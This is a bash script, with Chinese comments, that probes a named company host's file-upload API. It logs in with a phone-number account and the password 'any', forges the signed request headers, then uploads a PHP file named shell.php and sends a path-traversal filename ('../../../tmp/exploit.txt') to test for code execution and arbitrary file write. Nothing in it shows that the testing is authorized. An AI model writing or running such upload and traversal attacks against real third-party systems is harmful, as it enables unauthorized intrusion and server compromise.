#!/bin/bash

TOKEN=$(curl -sk "http://longnows-gts.t.kkgroup.cn/pms/api/v1/pmsUser/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"account":"19129430218","password":"any"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['accessToken'])")

sign_request() {
  REQUEST_ID=$(uuidgen | tr '[:upper:]' '[:lower:]')
  TIMESTAMP=$(date +%s000)
  NONCE=$(echo -n "${REQUEST_ID}${TIMESTAMP}" | md5)
  echo "$REQUEST_ID|$TIMESTAMP|$NONCE"
}

echo "====== 上传测试 - typeList参数 ======"

# 测试1: typeList参数
echo ""
echo "--- 测试1: typeList参数 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoodsAttachment/batchUploadFile" -X POST \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -F "file=@/tmp/test.txt" \
  -F 'bizUid=01M11DF8GW4GMWVTG4WGQA826N' \
  -F 'typeList=1' 2>&1

# 测试2: typeList JSON数组
echo ""
echo "--- 测试2: typeList JSON数组 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoodsAttachment/batchUploadFile" -X POST \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -F "file=@/tmp/test.txt" \
  -F 'bizUid=01M11DF8GW4GMWVTG4WGQA826N' \
  -F 'typeList=[1]' 2>&1

# 测试3: 上传PHP文件 typeList
echo ""
echo "--- 测试3: 上传PHP文件 typeList ---"
echo "<?php phpinfo(); ?>" > /tmp/shell.php
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoodsAttachment/batchUploadFile" -X POST \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -F "file=@/tmp/shell.php;filename=shell.php;type=application/octet-stream" \
  -F 'bizUid=01M11DF8GW4GMWVTG4WGQA826N' \
  -F 'typeList=[1]' 2>&1

# 测试4: 路径遍历上传
echo ""
echo "--- 测试4: 路径遍历 ---"
echo "test" > /tmp/exploit.txt
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoodsAttachment/batchUploadFile" -X POST \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -F "file=@/tmp/exploit.txt;filename=../../../tmp/exploit.txt" \
  -F 'bizUid=01M11DF8GW4GMWVTG4WGQA826N' \
  -F 'typeList=[1]' 2>&1